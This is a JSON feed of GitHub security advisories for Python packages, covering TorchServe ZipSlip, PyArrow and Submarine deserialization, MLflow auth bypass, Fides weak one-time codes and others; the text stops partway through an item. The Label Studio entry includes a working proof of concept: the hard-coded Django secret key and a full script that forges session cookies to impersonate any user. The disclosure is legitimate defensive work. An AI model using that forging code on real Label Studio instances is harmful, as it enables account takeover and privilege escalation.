{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>Microsoft Common Data Model SDK Denial of Service Vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36566\">https://nvd.nist.gov/vuln/detail/CVE-2023-36566</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36566</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm2m-7hpw-fpmq\">https://github.com/advisories/GHSA-vm2m-7hpw-fpmq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm2m-7hpw-fpmq",
            "title": "[commondatamodel-objectmodel] Microsoft Common Data Model SDK Denial of Service Vulnerability",
            "date_modified": "2023-11-21T18:29:10.000Z",
            "date_published": "2023-10-10T18:31:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm2m-7hpw-fpmq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Using the model/workflow management API, there is a chance of uploading potentially harmful archives that contain files that are extracted to any location on the filesystem that is within the process permissions. Leveraging this issue could aid third-party actors in hiding harmful code in open-source/public models, which can be downloaded from the internet, and take advantage of machines running Torchserve.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The ZipSlip issue in TorchServe has been fixed by validating the paths of files contained within a zip archive before extracting them: <a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a></p>\n<p>TorchServe release 0.9.0 includes fixes to address the ZipSlip vulnerability:\n<a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a>\n<a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></p>\n<h3 id=\"credit\">Credit</h3>\n<p>We would like to thank Oligo Security for responsibly disclosing this issue.</p>\n<p>If you have any questions or comments about this advisory, we ask that you contact AWS Security via our <a href=\"https://aws.amazon.com/security/vulnerability-reporting\">vulnerability reporting page</a> or directly via email to <a href=\"mailto:aws-security@amazon.com\">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp\">https://github.com/pytorch/serve/security/advisories/GHSA-m2mj-pr4f-h9jp</a></li>\n<li><a href=\"https://github.com/pytorch/serve/pull/2634\">https://github.com/pytorch/serve/pull/2634</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48299\">https://nvd.nist.gov/vuln/detail/CVE-2023-48299</a></li>\n<li><a href=\"https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb\">https://github.com/pytorch/serve/commit/bfb3d42396727614aef625143b4381e64142f9bb</a></li>\n<li><a href=\"https://github.com/pytorch/serve/releases/tag/v0.9.0\">https://github.com/pytorch/serve/releases/tag/v0.9.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m2mj-pr4f-h9jp\">https://github.com/advisories/GHSA-m2mj-pr4f-h9jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m2mj-pr4f-h9jp",
            "title": "[torchserve] TorchServe ZipSlip",
            "date_modified": "2023-11-21T21:33:50.000Z",
            "date_published": "2023-11-21T01:40:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m2mj-pr4f-h9jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Software Foundation Apache Submarine has a bug when serializing against yaml. The bug is caused by snakeyaml  <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-1471\">https://nvd.nist.gov/vuln/detail/CVE-2022-1471</a> .</p>\n<p>Apache Submarine uses JAXRS to define REST endpoints.  In order to\nhandle YAML requests (using application/yaml content-type), it defines\na YamlEntityProvider entity provider that will process all incoming\nYAML requests.  In order to unmarshal the request, the readFrom method\nis invoked, passing the entityStream containing the user-supplied data in <code>submarine-server/server-core/src/main/java/org/apache/submarine/server/utils/YamlUtils.java</code>.</p>\n<p>We have now fixed this issue in the new version by replacing to <code>jackson-dataformat-yaml</code>.\nThis issue affects Apache Submarine: from 0.7.0 before 0.8.0.&nbsp;Users are recommended to upgrade to version 0.8.0, which fixes this issue.\nIf using the version smaller than 0.8.0  and not want to upgrade, you can try cherry-pick PR  <a href=\"https://github.com/apache/submarine/pull/1054\">https://github.com/apache/submarine/pull/1054</a>  and rebuild the submart-server image to fix this.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46302\">https://nvd.nist.gov/vuln/detail/CVE-2023-46302</a></li>\n<li><a href=\"https://github.com/apache/submarine/pull/1054\">https://github.com/apache/submarine/pull/1054</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/SUBMARINE-1371\">https://issues.apache.org/jira/browse/SUBMARINE-1371</a></li>\n<li><a href=\"https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5\">https://lists.apache.org/thread/zf0wppzh239j4h131hm1dbswfnztxrr5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-240.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8hcr-5x2g-9f7j\">https://github.com/advisories/GHSA-8hcr-5x2g-9f7j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8hcr-5x2g-9f7j",
            "title": "[apache-submarine] Deserialization of Untrusted Data in apache-submarine",
            "date_modified": "2023-11-20T23:26:48.000Z",
            "date_published": "2023-11-20T09:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8hcr-5x2g-9f7j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"introduction\">Introduction</h1>\n<p>This write-up describes a vulnerability found in <a href=\"https://github.com/HumanSignal/label-studio\">Label Studio</a>, a popular open source data labeling tool. The vulnerability was found to affect versions before <code>1.8.2</code>, where a patch was introduced.</p>\n<h1 id=\"overview\">Overview</h1>\n<p>In <a href=\"https://github.com/HumanSignal/label-studio/tree/1.8.1\">Label Studio version 1.8.1</a>, a hard coded Django <code>SECRET_KEY</code> was set in the application settings. The Django <code>SECRET_KEY</code> is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.</p>\n<p>However, the Django framework inserts a <code>_auth_user_hash</code> claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) and forge session tokens for all users on Label Studio using the hard coded <code>SECRET_KEY</code>.</p>\n<h1 id=\"description\">Description</h1>\n<p>Below is the code snippet of the Django settings file at <a href=\"https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108\"><code>label_studio/core/settings/base.py</code></a>.</p>\n<pre><code class=\"language-python\"># SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n</code></pre>\n<p>This secret is hard coded across all instances of Label Studio.</p>\n<h1 id=\"proof-of-concept\">Proof of Concept</h1>\n<p>Below are the steps that an attacker could do to forge a session token of any account on Label Studio:</p>\n<ol>\n<li><p>Exploit the ORM Leak vulnerability (patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email <code>ghostccamm@testvm.local</code> with the password hash <code>pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=</code> that was retrieved.</p>\n</li>\n<li><p>Create a new Django project with an empty application. In <code>cookieforge/cookieforge/settings.py</code> set the <code>SECRET_KEY</code> to <code>$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n</code>. Create a management command with the following code that will be used to create forged session tokens.</p>\n</li>\n</ol>\n<pre><code class=\"language-python\">from typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -&gt; None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -&gt; str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n</code></pre>\n<ol start=\"3\">\n<li>Next run the following command replacing the <code>{user_id}</code> with the user ID of the account you want to the impersonate and <code>{user_hash}</code> with the victim's password hash. Copy the session token that is printed.</li>\n</ol>\n<pre><code class=\"language-python\">python3 manage.py forgecookie {user_id} '{user_hash}'\n</code></pre>\n<ol start=\"4\">\n<li>Change the <code>sessionid</code> cookie on the browser and refresh the page. Observe being authenticated as the victim user.</li>\n</ol>\n<h1 id=\"impact\">Impact</h1>\n<p>This vulnerability can be chained with the ORM Leak vulnerability (which was patched in <a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0\"><code>1.9.2post0</code></a>) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.</p>\n<h1 id=\"remediation-advice\">Remediation Advice</h1>\n<p>It is important to note that the hard coded <code>SECRET_KEY</code> has already been removed in Label Studio versions <code>&gt;=1.8.2</code>. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.</p>\n<p>We recommend that Human Signal to release a public disclosure about the hard coded <code>SECRET_KEY</code> to encourage users to patch to a version <code>&gt;=1.8.2</code> to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.</p>\n<h1 id=\"discovered\">Discovered</h1>\n<ul>\n<li>August 2023, Robert Schuh, @robbilie</li>\n<li>August 2023, Alex Brown, elttam</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-f475-x83m-rx5m</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/pull/4690\">https://github.com/HumanSignal/label-studio/pull/4690</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b\">https://github.com/HumanSignal/label-studio/commit/3d06c5131c15600621e08b06f07d976887cde81b</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.8.2\">https://github.com/HumanSignal/label-studio/releases/tag/1.8.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-43791\">https://nvd.nist.gov/vuln/detail/CVE-2023-43791</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f475-x83m-rx5m\">https://github.com/advisories/GHSA-f475-x83m-rx5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f475-x83m-rx5m",
            "title": "[label-studio] Label Studio has Hardcoded Django `SECRET_KEY` that can be Abused to Forge Session Tokens",
            "date_modified": "2023-11-20T20:49:35.000Z",
            "date_published": "2023-11-09T14:42:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f475-x83m-rx5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An attacker is able to arbitrarily create an account in MLflow bypassing any authentication requirement.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6014\">https://nvd.nist.gov/vuln/detail/CVE-2023-6014</a></li>\n<li><a href=\"https://huntr.com/bounties/3e64df69-ddc2-463e-9809-d07c24dc1de4\">https://huntr.com/bounties/3e64df69-ddc2-463e-9809-d07c24dc1de4</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/issues/9669\">https://github.com/mlflow/mlflow/issues/9669</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4qq5-mxxx-m6gg\">https://github.com/advisories/GHSA-4qq5-mxxx-m6gg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4qq5-mxxx-m6gg",
            "title": "[mlflow] MLflow authentication requirement bypass can allow a user to arbitrarily create an account",
            "date_modified": "2023-11-20T16:48:03.000Z",
            "date_published": "2023-11-16T21:30:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4qq5-mxxx-m6gg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files). This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.</p>\n<p>Note that Ibis itself makes <strong>extremely limited</strong> use of <code>pyarrow.parquet.read_table</code>:</p>\n<ol>\n<li><code>read_table</code> is used in tests, where the input file is entirely controlled by the Ibis developers</li>\n<li><code>read_table</code> is used in the <code>ibis/examples/__init__.py</code> as a fallback for backends that don't support reading Parquet directly. Parquet data used in <code>ibis.examples</code> are also managed by the Ibis developers. This Parquet data is generated from CSV files and SQLite databases.</li>\n<li>The Pandas and Dask backends both use PyArrow to read Parquet files and are therefore affected.</li>\n</ol>\n<p>Ibis <strong>does not</strong> make use of APIs that directly read from either Arrow IPC files or Feather files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Ibis imports the <code>pyarrow_hotfix</code> package wherever pyarrow is used, as of version 7.1.0.</p>\n<p>Upgrading to Arrow 14.0.1 is also a possible solution, starting in Ibis 7.1.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Install <a href=\"https://pypi.org/project/pyarrow-hotfix/\"><code>pyarrow_hotfix</code></a> and run <code>import pyarrow_hotfix</code> ahead of any and all <code>import ibis</code> statements.</p>\n<p>For example:</p>\n<pre><code class=\"language-python\">import ibis\n</code></pre>\n<p>becomes</p>\n<pre><code class=\"language-python\">import pyarrow_hotfix\nimport ibis\n</code></pre>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-47248\">https://www.cve.org/CVERecord?id=CVE-2023-47248</a>\n<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47248\">https://nvd.nist.gov/vuln/detail/CVE-2023-47248</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ibis-project/ibis/security/advisories/GHSA-x563-6hqv-26mr\">https://github.com/ibis-project/ibis/security/advisories/GHSA-x563-6hqv-26mr</a></li>\n<li><a href=\"https://github.com/ibis-project/ibis/commit/0fa1e5dc06783c01e912e8de4d7e10186ca0e364\">https://github.com/ibis-project/ibis/commit/0fa1e5dc06783c01e912e8de4d7e10186ca0e364</a></li>\n<li><a href=\"https://github.com/ibis-project/ibis/releases/tag/7.1.0\">https://github.com/ibis-project/ibis/releases/tag/7.1.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x563-6hqv-26mr\">https://github.com/advisories/GHSA-x563-6hqv-26mr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x563-6hqv-26mr",
            "title": "[ibis-framework] Ibis PyArrow dependency allows arbitrary code execution when loading a malicious data file",
            "date_modified": "2023-11-17T21:47:11.000Z",
            "date_published": "2023-11-17T21:47:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x563-6hqv-26mr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>PyPinkSign v0.5.1 uses a non-random or static IV for Cipher Block Chaining (CBC) mode in AES encryption. This vulnerability can lead to the disclosure of information and communications.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48056\">https://nvd.nist.gov/vuln/detail/CVE-2023-48056</a></li>\n<li><a href=\"https://gxx777.github.io/PyPinkSign_v0.5.1_Cryptographic_API_Misuse_Vulnerability.md\">https://gxx777.github.io/PyPinkSign_v0.5.1_Cryptographic_API_Misuse_Vulnerability.md</a></li>\n<li><a href=\"http://bandoche.com\">http://bandoche.com</a></li>\n<li><a href=\"http://pypinksign.com\">http://pypinksign.com</a></li>\n<li><a href=\"https://github.com/bandoche/PyPinkSign/issues/29\">https://github.com/bandoche/PyPinkSign/issues/29</a></li>\n<li><a href=\"https://github.com/bandoche/PyPinkSign/commit/e1809ddf6a266e9007e10f0486b462fa7f89a43d\">https://github.com/bandoche/PyPinkSign/commit/e1809ddf6a266e9007e10f0486b462fa7f89a43d</a></li>\n<li><a href=\"https://github.com/bandoche/PyPinkSign/blob/main/pypinksign/pypinksign.py#L504\">https://github.com/bandoche/PyPinkSign/blob/main/pypinksign/pypinksign.py#L504</a></li>\n<li><a href=\"https://github.com/bandoche/PyPinkSign/blob/main/pypinksign/pypinksign.py#L537\">https://github.com/bandoche/PyPinkSign/blob/main/pypinksign/pypinksign.py#L537</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fxff-wxxv-c2jc\">https://github.com/advisories/GHSA-fxff-wxxv-c2jc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fxff-wxxv-c2jc",
            "title": "[pypinksign] PyPinkSign uses a non-random or static IV for Cipher Block Chaining (CBC) mode in AES encryption",
            "date_modified": "2023-11-17T21:42:39.000Z",
            "date_published": "2023-11-16T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fxff-wxxv-c2jc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data in IPC and Parquet readers in PyArrow versions 0.14.0 to 14.0.0 allows arbitrary code execution. An application is vulnerable if it reads Arrow IPC, Feather or Parquet data from untrusted sources (for example user-supplied input files).</p>\n<p>This vulnerability only affects PyArrow, not other Apache Arrow implementations or bindings.</p>\n<p>It is recommended that users of PyArrow upgrade to 14.0.1. Similarly, it is recommended that downstream libraries upgrade their dependency requirements to PyArrow 14.0.1 or later. PyPI packages are already available, and we hope that conda-forge packages will be available soon.</p>\n<p>If it is not possible to upgrade, maintainers provide a separate package <code>pyarrow-hotfix</code> that disables the vulnerability on older PyArrow versions. See <a href=\"https://pypi.org/project/pyarrow-hotfix/\">https://pypi.org/project/pyarrow-hotfix/</a>  for instructions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-47248\">https://nvd.nist.gov/vuln/detail/CVE-2023-47248</a></li>\n<li><a href=\"https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n\">https://lists.apache.org/thread/yhy7tdfjf9hrl9vfrtzo8p2cyjq87v7n</a></li>\n<li><a href=\"https://pypi.org/project/pyarrow-hotfix/\">https://pypi.org/project/pyarrow-hotfix/</a></li>\n<li><a href=\"https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf\">https://github.com/apache/arrow/commit/f14170976372436ec1d03a724d8d3f3925484ecf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wvp-7f3h-6wmm\">https://github.com/advisories/GHSA-5wvp-7f3h-6wmm</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/pyarrow/PYSEC-2023-238.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/pyarrow/PYSEC-2023-238.yaml</a></li>\n<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-47248\">https://www.cve.org/CVERecord?id=CVE-2023-47248</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2023/11/08/7\">https://www.openwall.com/lists/oss-security/2023/11/08/7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5wvp-7f3h-6wmm",
            "title": "[pyarrow] PyArrow: Arbitrary code execution when loading a malicious data file",
            "date_modified": "2023-11-20T22:31:02.000Z",
            "date_published": "2023-11-09T09:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5wvp-7f3h-6wmm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Missing SSL certificate validation in HTTPie v3.2.2 allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48052\">https://nvd.nist.gov/vuln/detail/CVE-2023-48052</a></li>\n<li><a href=\"https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md\">https://gxx777.github.io/HTTPie_3.2.2_Cryptographic_API_Misuse_Vulnerability.md</a></li>\n<li><a href=\"https://github.com/httpie/cli/blob/master/httpie/client.py#L33\">https://github.com/httpie/cli/blob/master/httpie/client.py#L33</a></li>\n<li><a href=\"https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44\">https://github.com/httpie/cli/blob/master/httpie/internal/update_warnings.py#L44</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8r96-8889-qg2x\">https://github.com/advisories/GHSA-8r96-8889-qg2x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8r96-8889-qg2x",
            "title": "[httpie] HTTPie allows attackers to eavesdrop on communications between the host and server via a man-in-the-middle attack",
            "date_modified": "2023-11-16T22:16:45.000Z",
            "date_published": "2023-11-16T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8r96-8889-qg2x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>MLflow allowed arbitrary files to be PUT onto the server.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6015\">https://nvd.nist.gov/vuln/detail/CVE-2023-6015</a></li>\n<li><a href=\"https://huntr.com/bounties/43e6fb72-676e-4670-a225-15d6836f65d3\">https://huntr.com/bounties/43e6fb72-676e-4670-a225-15d6836f65d3</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/pull/10330\">https://github.com/mlflow/mlflow/pull/10330</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7\">https://github.com/mlflow/mlflow/commit/cf83dad4df26dd4a850622fe8a51ccab1471a5e7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f798-qm4r-23r5\">https://github.com/advisories/GHSA-f798-qm4r-23r5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f798-qm4r-23r5",
            "title": "[mlflow] MLflow allowed arbitrary files to be PUT onto the server",
            "date_modified": "2023-11-16T21:25:20.000Z",
            "date_published": "2023-11-16T18:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f798-qm4r-23r5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A path traversal vulnerability exists in Ansible when extracting tarballs. An attacker could craft a malicious tarball so that when using the galaxy importer of Ansible Automation Hub, a symlink could be dropped on the disk, resulting in files being overwritten.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-5189\">https://nvd.nist.gov/vuln/detail/CVE-2023-5189</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2023-5189\">https://access.redhat.com/security/cve/CVE-2023-5189</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2234387\">https://bugzilla.redhat.com/show_bug.cgi?id=2234387</a></li>\n<li><a href=\"https://github.com/ansible/galaxy-importer/blob/2c5c7c05fdfb0835878234b36de32902c703616d/galaxy_importer/collection.py#L160-L165\">https://github.com/ansible/galaxy-importer/blob/2c5c7c05fdfb0835878234b36de32902c703616d/galaxy_importer/collection.py#L160-L165</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-55g2-vm3q-7w52\">https://github.com/advisories/GHSA-55g2-vm3q-7w52</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-55g2-vm3q-7w52",
            "title": "[galaxy-importer] Ansible galaxy-importer Path Traversal vulnerability",
            "date_modified": "2023-11-21T21:34:15.000Z",
            "date_published": "2023-11-15T00:31:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-55g2-vm3q-7w52"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Fides Privacy Center allows data subject users to submit privacy and consent requests to data controller users of the Fides web application.</p>\n<p>Privacy requests allow data subjects to submit a request to access all person data held by the data controller, or delete/erase it.  Consent request allows data subject users to modify their privacy preferences for how the data controller uses their personal data e.g. data sales and sharing consent opt-in/opt-out.</p>\n<p>If <code>subject_identity_verification_required</code> in the <code>[execution]</code> section of <code>fides.toml</code> or the env var <code>FIDES__EXECUTION__SUBJECT_IDENTITY_VERIFICATION_REQUIRED</code> is set to <code>True</code> on the fides webserver backend, data subjects are sent a one-time code to their email address or phone number, depending on messaging configuration, and the one-time code must be entered in the Privacy Center UI by the data subject before the privacy or consent request is submitted.</p>\n<p>It was identified that the one-time code values for these requests were generated by the python <code>random</code> module, a cryptographically weak pseduo-random number generator (PNRG). If an attacker generates several hundred consecutive one-time codes, this vulnerability allows the attacker to predict all future one-time code values during the lifetime of the backend python process.</p>\n<p>There is no security impact on data access requests as the personal data download package is not shared in the Privacy Center itself. However, this vulnerability allows an attacker to (i) submit a verified data erasure request, resulting in deletion of data for the targeted user and (ii) submit a verified consent request, modifying a user's privacy preferences.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patched in Fides version <code>2.24.0</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://peps.python.org/pep-0506/\">https://peps.python.org/pep-0506/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ethyca/fides/security/advisories/GHSA-82vr-5769-6358\">https://github.com/ethyca/fides/security/advisories/GHSA-82vr-5769-6358</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-48224\">https://nvd.nist.gov/vuln/detail/CVE-2023-48224</a></li>\n<li><a href=\"https://github.com/ethyca/fides/commit/685bae61c203d29ed189f4b066a5223a9bb774c6\">https://github.com/ethyca/fides/commit/685bae61c203d29ed189f4b066a5223a9bb774c6</a></li>\n<li><a href=\"https://peps.python.org/pep-0506/\">https://peps.python.org/pep-0506/</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-82vr-5769-6358\">https://github.com/advisories/GHSA-82vr-5769-6358</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-82vr-5769-6358",
            "title": "[ethyca-fides] Ethyca Fides Cryptographically Weak Generation of One-Time Codes for Identity Verification",
            "date_modified": "2023-11-16T14:33:07.000Z",
            "date_published": "2023-11-16T14:33:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-82vr-5769-6358"
            },
            "tags": [
                "severity"
            ]
        },
        {
